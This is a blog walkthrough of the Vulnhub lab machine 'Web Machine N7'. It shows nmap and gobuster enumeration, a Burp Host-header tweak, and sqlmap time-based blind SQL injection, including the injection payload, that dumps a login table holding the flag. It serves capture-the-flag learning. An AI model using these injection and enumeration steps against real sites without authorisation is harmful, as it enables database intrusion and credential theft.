---
title: "Web Machine N7: Vulnhub Walkthrough"
date: 2024-08-09T15:00:35-08:00
draft: false
description: "Vulnhub's Web Machine N7. Labeled as a medium difficulty box with a lot of directory enumeration and some use of sqlmap"
noindex: false
featured: false
pinned: false
# comments: false
series:
  - walkthroughs
categories:
#  - 
tags:
#  - 
images: [web-machine-n7.jpg]
#  - 
# menu:
#   main:
#     weight: 100
#     params:
#       icon:
#         vendor: bs
#         name: book
#         color: '#e24d0e'
meta:
  reading_time: false
---

## Introduction

| URL | [https://www.vulnhub.com/entry/web-machine-n7,756/](https://www.vulnhub.com/entry/web-machine-n7,756/) |
| --- | --- |
| Platform | Vulnhub |
| Difficulty | ![Static Badge](https://img.shields.io/badge/medium-orange) |

## Walkthrough

Run `nmap -A` scan against all TCP ports:

```shell
┌──(vagrant㉿kali)-[~]
└─$ nmap -p- -A 192.168.5.118                      
Starting Nmap 7.92 ( https://nmap.org ) at 2024-08-06 17:31 PDT
Nmap scan report for 192.168.5.118
Host is up (0.011s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.46 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.46 (Debian)
```

\
Run `gobuster` with common file extension checks to discover `exploit.html`:

```shell
┌──(vagrant㉿kali)-[~]
└─$ gobuster dir -u http://192.168.5.118/ -e -r -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -x html,htm,asp,aspx,jsp,php,cgi,txt,xml
...
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://192.168.5.118/.html                (Status: 403) [Size: 278]
http://192.168.5.118/.htm                 (Status: 403) [Size: 278]
http://192.168.5.118/.php                 (Status: 403) [Size: 278]
http://192.168.5.118/index.html           (Status: 200) [Size: 1620]
http://192.168.5.118/profile.php          (Status: 200) [Size: 1473]
http://192.168.5.118/javascript           (Status: 403) [Size: 278]
http://192.168.5.118/exploit.html         (Status: 200) [Size: 279]
```

\
Browse to `exploit.html` & intercept request with `Burpsuite`. Note that the `POST` request changes the "Host" header to localhost; change this instead to the target wev server (in this case, 192.168.5.118) to receive the first portion of the flag:

```shell
FLAG{N7
```

\
{{< bs/alert warning >}}Next: cheat & find the `/enter_network/` page by googling for a walkthrough. There doesn't appear to be any other feasible way to find this page..
{{< /bs/alert >}}

\
Intercept `POST` request containing user/pass parameters via `Burpsuite`, & save this HTTP request to `request.txt`:

```shell
POST /enter_network/ HTTP/1.1
Host: 192.168.5.118
Content-Length: 33
Cache-Control: max-age=0
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
Origin: http://192.168.5.118
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.5.118/enter_network/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

user=admin&pass=password&sub=SEND
```

\
Feed `request.txt` to sqlmap and attempt to determine database names, as follows:

```shell
┌──(vagrant㉿kali)-[~]
└─$ sqlmap -r request.txt --dbs
...
[20:06:56] [INFO] parsing HTTP request from 'request.txt'
[20:06:57] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('role=MjEyMzJmMjk...FmYzM%253D;user=JGFyZ29uMmk...lkMWZSaXlB'). Do you want to use those [Y/n] y
...
[20:07:29] [INFO] POST parameter 'user' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
[20:08:14] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[20:08:14] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[20:08:20] [INFO] checking if the injection point on POST parameter 'user' is a false positive
POST parameter 'user' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 72 HTTP(s) requests:
---
Parameter: user (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: user=admin' AND (SELECT 3878 FROM (SELECT(SLEEP(5)))tFqA) AND 'oZEE'='oZEE&pass=password&sub=SEND
---
[20:12:03] [INFO] the back-end DBMS is MySQL
[20:12:03] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
[20:12:03] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
web server operating system: Linux Debian
web application technology: Apache 2.4.46
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[20:12:16] [INFO] fetching database names
[20:12:16] [INFO] fetching number of databases
[20:12:16] [INFO] retrieved: 4
[20:12:23] [INFO] retrieved: 
[20:12:29] [INFO] adjusting time delay to 2 seconds due to good response times
information_schema
[20:15:00] [INFO] retrieved: Machine
[20:15:54] [INFO] retrieved: mysql
[20:16:38] [INFO] retrieved: performance_schema
available databases [4]:
[*] information_schema
[*] Machine
[*] mysql
[*] performance_schema
...
```

\
Dump the tables from the `Machine` database to receive the remainder of the flag:

```shell
sqlmap -r request.txt -D Machine --dump
...
20:34:41] [INFO] fetching columns for table 'login' in database 'Machine'
[20:34:41] [INFO] retrieved: 3
[20:34:47] [INFO] retrieved: username
[20:35:27] [INFO] retrieved: password
[20:36:12] [INFO] retrieved: role
[20:36:36] [INFO] fetching entries for table 'login' in database 'Machine'
[20:36:36] [INFO] fetching number of entries for table 'login' in database 'Machine'
[20:36:36] [INFO] retrieved: 1
[20:36:39] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)    
FLAG{N7:KSA_01}
[20:38:16] [INFO] retrieved: admin
[20:38:42] [INFO] retrieved: administ
[20:39:34] [ERROR] invalid character detected. retrying..
[20:39:34] [WARNING] increasing time delay to 2 seconds
rator
Database: Machine
Table: login
[1 entry]
+-------+-----------------+---------------+
| role  | password        | username      |
+-------+-----------------+---------------+
| admin | FLAG{N7:KSA_01} | administrator |
+-------+-----------------+---------------+
```

\
woot.